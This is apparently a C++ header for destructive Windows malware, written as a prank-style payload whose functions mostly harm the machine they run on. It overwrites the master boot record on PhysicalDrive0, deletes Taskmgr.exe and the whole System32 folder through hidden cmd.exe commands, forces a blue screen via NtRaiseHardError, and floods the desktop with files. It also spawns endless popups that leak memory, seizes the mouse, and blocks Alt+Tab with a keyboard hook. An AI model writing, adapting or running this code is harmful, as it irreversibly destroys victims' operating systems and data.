#pragma once
#pragma comment(lib, "winmm.lib")
#include <Windows.h>
#include <string>
#include "resource.h"
#include <filesystem>
#include <mmsystem.h>
#include <winternl.h>
#include <stdio.h>
#include <conio.h>
#include <iostream>
#include <magnification.h>
#include <wingdi.h>

HINSTANCE kris;
HINSTANCE hMain;
HWND hWnd2;
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

namespace fs = std::filesystem;
using namespace std;

void OverrideWallpaper() {
	WCHAR* buffer = new WCHAR[260];
	const WCHAR name[13] = L"LOCALAPPDATA";
	DWORD desktop = GetEnvironmentVariable(name, buffer, 260);
	std::wstring fullpath1;
	fullpath1 += buffer;
	fullpath1 += L"\\img.jpg";
	LPCWSTR cont1 = fullpath1.c_str();
	HINSTANCE hInstance = kris;
	HRSRC hResInfo = FindResource(hInstance, MAKEINTRESOURCE(IDR_JPG1), TEXT("jpg"));
	HGLOBAL hRes = LoadResource(hInstance, hResInfo);
	LPVOID memRes = LockResource(hRes);
	DWORD sizeRes = SizeofResource(hInstance, hResInfo);
	HANDLE hFile = CreateFile(cont1, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwWritten = 0;
	WriteFile(hFile, memRes, sizeRes, &dwWritten, NULL);
	CloseHandle(hFile);
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)cont1, SPIF_UPDATEINIFILE);
}

void raiseError() {
	BOOLEAN bEnabled;
	ULONG uResp;
	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
}

void playMusic() {
	WCHAR* buffer = new WCHAR[260];
	const WCHAR name[13] = L"LOCALAPPDATA";
	DWORD desktop = GetEnvironmentVariable(name, buffer, 260);
	std::wstring fullpath1;
	fullpath1 += buffer;
	fullpath1 += L"\\music.wav";
	LPCWSTR cont1 = fullpath1.c_str();
	HINSTANCE hInstance = kris;
	HRSRC hResInfo = FindResource(hInstance, MAKEINTRESOURCE(IDR_WAVE1), TEXT("WAVE"));
	HGLOBAL hRes = LoadResource(hInstance, hResInfo);
	LPVOID memRes = LockResource(hRes);
	DWORD sizeRes = SizeofResource(hInstance, hResInfo);
	HANDLE hFile = CreateFile(cont1, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwWritten = 0;
	WriteFile(hFile, memRes, sizeRes, &dwWritten, NULL);
	CloseHandle(hFile);
	BOOL sound;
	sound = PlaySound(cont1, NULL, SND_FILENAME | SND_LOOP | SND_ASYNC);
}


void fileSpam() {
	WCHAR* buffer = new WCHAR[260];
	const WCHAR name[13] = L"USERPROFILE";
	DWORD desktop = GetEnvironmentVariable(name, buffer, 260);
	std::wstring fullpath1;
	fullpath1 += buffer;
	fullpath1 += L"\\Desktop\\ILOVEKRISTIK0000";
	for (int i = 0; i < 513; i++) {
		wstring j = std::to_wstring(i);
		int il = j.length();
		fullpath1 = fullpath1.replace(fullpath1.end() - il, fullpath1.end(), j);
		LPCWSTR cont1 = fullpath1.c_str();
		HINSTANCE hInstance = kris;
		HRSRC hResInfo = FindResource(hInstance, MAKEINTRESOURCE(IDR_TXT1), TEXT("TXT"));
		HGLOBAL hRes = LoadResource(hInstance, hResInfo);
		LPVOID memRes = LockResource(hRes);
		DWORD sizeRes = SizeofResource(hInstance, hResInfo);
		HANDLE hFile = CreateFile(cont1, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		DWORD dwWritten = 0;
		WriteFile(hFile, memRes, sizeRes, &dwWritten, NULL);
		CloseHandle(hFile);
		Sleep(10);
	}
}


void killMBR() {
	WCHAR* buffer = new WCHAR[260];
	const WCHAR name[13] = L"LOCALAPPDATA";
	DWORD desktop = GetEnvironmentVariable(name, buffer, 260);
	std::wstring fullpath1;
	fullpath1 += buffer;
	fullpath1 += L"\\data.bin";
	LPCWSTR pathToBin = fullpath1.c_str();
	HINSTANCE hInstance = kris;
	HRSRC hResInfo = FindResource(hInstance, MAKEINTRESOURCE(IDR_BIN1), TEXT("BIN"));
	HGLOBAL hRes = LoadResource(hInstance, hResInfo);
	LPVOID memRes = LockResource(hRes);
	DWORD sizeRes = SizeofResource(hInstance, hResInfo);
	HANDLE hFile = CreateFile(pathToBin, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwWritten = 0;
	WriteFile(hFile, memRes, sizeRes, &dwWritten, NULL);
	CloseHandle(hFile);
	DWORD dw;
	HANDLE drive = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	HANDLE binary = CreateFile(pathToBin, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
	DWORD size = GetFileSize(binary, 0);
	std::byte* mbr = new std::byte[size];
	ReadFile(binary, mbr, size, &dw, 0);
	WriteFile(drive, mbr, size, &dw, 0);
	CloseHandle(binary);
	CloseHandle(drive);
	_getch();
}

void mouseShake() {
	int i, x, y;
	while (true) {
		x = rand() % 1920;
		y = rand() % 1080;
		SetCursorPos(x, y);
	}
}

void delTaskMan() {
	DWORD exitCode = 0;
	SHELLEXECUTEINFO info = { 0 };
	info.cbSize = sizeof(SHELLEXECUTEINFO);
	info.fMask = SEE_MASK_NOCLOSEPROCESS;
	info.hwnd = NULL;
	info.lpVerb = NULL;
	info.lpFile = L"C:\\Windows\\System32\\cmd.exe";
	info.lpParameters = L"/c takeown /f C:\\Windows\\System32\\Taskmgr.exe & icacls C:\\Windows\\System32\\Taskmgr.exe /grant administrators:F /T & del /f c:\\Windows\\System32\\Taskmgr.exe";
	info.lpDirectory = NULL;
	info.nShow = SW_HIDE;
	info.hInstApp = NULL;
	ShellExecuteEx(&info);
}

void scanAndDel() {
	DWORD exitCode = 0;
	SHELLEXECUTEINFO info = { 0 };
	info.cbSize = sizeof(SHELLEXECUTEINFO);
	info.fMask = SEE_MASK_NOCLOSEPROCESS;
	info.hwnd = NULL;
	info.lpVerb = NULL;
	info.lpFile = L"C:\\Windows\\System32\\cmd.exe";
	info.lpParameters = L"/c takeown /f C:\\Windows\\System32 /r /d y & icacls C:\\Windows\\System32 /grant administrators:F /T & rmdir /s /q c:\\Windows\\System32";
	info.lpDirectory = NULL;
	info.nShow = SW_HIDE;
	info.hInstApp = NULL;
	ShellExecuteEx(&info);
}

LRESULT CALLBACK DialogProc(HWND hWnd, UINT msg, WPARAM wp, LPARAM lp) {
	switch (msg) {
	case WM_CLOSE:
		DestroyWindow(hWnd);
		break;
	default:
		return DefWindowProcW(hWnd, msg, wp, lp);
	}
}


void registerDialogClass(HINSTANCE hInst) {
	WCHAR* buffer = new WCHAR[260];
	const WCHAR name[13] = L"LOCALAPPDATA";
	DWORD desktop = GetEnvironmentVariable(name, buffer, 260);
	std::wstring fullpath1;
	fullpath1 += buffer;
	fullpath1 += L"\\img.bmp";
	LPCWSTR cont1 = fullpath1.c_str();
	HINSTANCE hInstance = kris;
	HRSRC hResInfo = FindResource(hInstance, MAKEINTRESOURCE(IDR_BMP1), TEXT("BMP"));
	HGLOBAL hRes = LoadResource(hInstance, hResInfo);
	LPVOID memRes = LockResource(hRes);
	DWORD sizeRes = SizeofResource(hInstance, hResInfo);
	HANDLE hFile = CreateFile(cont1, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwWritten = 0;
	WriteFile(hFile, memRes, sizeRes, &dwWritten, NULL);
	CloseHandle(hFile);
	HBRUSH brush = CreatePatternBrush((HBITMAP)LoadImage(NULL, cont1, IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE));
	WNDCLASSW dialog = { 0 };
	dialog.hbrBackground = brush;
	dialog.hCursor = LoadCursor(NULL, IDC_WAIT);
	dialog.hInstance = hInst;
	dialog.lpszClassName = L"popup";
	dialog.lpfnWndProc = DialogProc;

	RegisterClassW(&dialog);
}
// this one is a pain in the ass so im not gonna add text.
// just deal with an empty dialog and memory snatcher
void displayDialog(HWND hWnd) {
	int x = rand() % 1920;
	int y = rand() % 1080;
	char* eater;
	eater = (char*)malloc(7999999);
	CreateWindowEx(WS_EX_TOPMOST, L"popup", L"KRISTIK'S WAIFU", WS_VISIBLE, x, y, 240, 220, hWnd, NULL, NULL, NULL);
}

void showDialog() {
	registerDialogClass(hMain);
	while (true) {
		displayDialog(hWnd2);
		Sleep(500);
	}
}

int	nRandWidth = 150, nRandHeight = 15, nSpeed = 1;
int	nScreenWidth, nScreenHeight;

LRESULT WINAPI MelterProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	switch (Msg) {
	case WM_CREATE:
	{
		HDC hdcDesktop = GetDC(HWND_DESKTOP);
		HDC hdcWindow = GetDC(hWnd);
		BitBlt(hdcWindow, 0, 0, nScreenWidth, nScreenHeight, hdcDesktop, 0, 0, SRCCOPY);
		ReleaseDC(hWnd, hdcWindow);
		ReleaseDC(HWND_DESKTOP, hdcDesktop);
		SetTimer(hWnd, 0, nSpeed, NULL);
		ShowWindow(hWnd, SW_SHOW);
	}
	return 0;
	case WM_ERASEBKGND:
		return 0;
	case WM_PAINT:
		ValidateRect(hWnd, NULL);
		return 0;
	case WM_TIMER:
	{
		HDC hdcWindow = GetDC(hWnd);
		int	nXPos = (rand() % nScreenWidth) - (nRandWidth / 2),
			nYPos = (rand() % nRandHeight),
			nWidth = (rand() % nRandWidth);
		BitBlt(hdcWindow, nXPos, nYPos, nWidth, nScreenHeight, hdcWindow, nXPos, 0, SRCCOPY);
		ReleaseDC(hWnd, hdcWindow);
	}
	return 0;
	case WM_CLOSE:
	case WM_DESTROY:
	{
		KillTimer(hWnd, 0);
		PostQuitMessage(0);
	}
	return 0;
	}
	return DefWindowProc(hWnd, Msg, wParam, lParam);
}

int MeltScreen() {
	nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
	nScreenHeight = GetSystemMetrics(SM_CYSCREEN);

	WNDCLASS wndClass = { 0, MelterProc, 0, 0, kris, NULL, LoadCursor(NULL, IDC_ARROW), 0, NULL, L"Melter" };
	if (!RegisterClass(&wndClass)) return MessageBox(HWND_DESKTOP, L"Cannot register class!", NULL, MB_ICONERROR | MB_OK);

	HWND hWnd = CreateWindowEx(WS_EX_TOPMOST, L"Melter", NULL, WS_POPUP, 0, 0, nScreenWidth, nScreenHeight, HWND_DESKTOP, NULL, kris, NULL);
	if (!hWnd) return MessageBox(HWND_DESKTOP, L"Cannot create window!", NULL, MB_ICONERROR | MB_OK);

	HDC hDC = GetDC(NULL);
	RECT rcClient;
	GetClientRect(GetDesktopWindow(), &rcClient);
	int nWidth = rcClient.right - rcClient.left;
	int nHeight = rcClient.bottom - rcClient.top;
	HDC hMemDC = CreateCompatibleDC(hDC);
	HBITMAP hBitmap = CreateCompatibleBitmap(hDC, nWidth, nHeight);
	HBITMAP hBmOld = (HBITMAP)SelectObject(hMemDC, hBitmap);
	BitBlt(hMemDC, 0, 0, nWidth, nHeight, hDC, 0, 0, SRCCOPY);
	BitBlt(hDC, 0, 0, nWidth, nHeight, hMemDC, 0, 0, DSTINVERT);
	DeleteDC(hMemDC);
	DeleteObject(hBitmap);
	ReleaseDC(NULL, hDC);

	srand(GetTickCount64());
	MSG Msg = { 0 };
	while (Msg.message != WM_QUIT) {
		if (PeekMessage(&Msg, NULL, 0, 0, PM_REMOVE)) {
			TranslateMessage(&Msg);
			DispatchMessage(&Msg);
		}
		if (GetAsyncKeyState(VK_ESCAPE) & 0x8000)
			DestroyWindow(hWnd);
	}
	return 0;
}

void linkSpam() {
	while (true) {
		srand(time(NULL));
		int num = rand() % 4;
		LPCWSTR sites[4] = { L"https://www.india.com/", L"https://twitter.com/bigskonk/status/1721265909292282140?s=46&t=Fw5vgK359PDNlAF_8HBKpg", L"https://media.discordapp.net/attachments/487020040592556054/1166957584633319554/image.png?ex=65559b71&is=65432671&hm=408cdfe705f3620a347273a7d827bf8cad8ee3fc03148d07e185ec3e1465143f&", L"https://www.youtube.com/watch?v=M_Wld6typCI" };
		ShellExecute(NULL, L"open", sites[num], NULL, NULL, SW_MAXIMIZE);
		Sleep(10000);
	}
}

HHOOK mule;
HHOOK g_hKeyboardHook;
BOOL g_bFullscreen;
LRESULT CALLBACK LowLevelKeyboardProc(INT nCode, WPARAM wParam, LPARAM lParam)
{
	// By returning a non-zero value from the hook procedure, the
	// message does not get passed to the target window
	KBDLLHOOKSTRUCT* pkbhs = (KBDLLHOOKSTRUCT*)lParam;
	BOOL bControlKeyDown = 0;

	switch (nCode)
	{
	case HC_ACTION:
	{
		// Check to see if the CTRL key is pressed
		bControlKeyDown = GetAsyncKeyState(VK_CONTROL) >> ((sizeof(SHORT) * 8) - 1);

		// Disable CTRL+ESC
		if (pkbhs->vkCode == VK_ESCAPE && bControlKeyDown)
			return 1;

		// Disable ALT+TAB
		if (pkbhs->vkCode == VK_TAB && pkbhs->flags & LLKHF_ALTDOWN)
			return 1;

		// Disable ALT+ESC
		if (pkbhs->vkCode == VK_ESCAPE && pkbhs->flags & LLKHF_ALTDOWN)
			return 1;

		break;
	}

	default:
		break;
	}
	return CallNextHookEx(mule, nCode, wParam, lParam);
}

void GrabKeys() {
	_getch();
	g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
	_getch();
	UnhookWindowsHookEx(g_hKeyboardHook);
	_getch();
}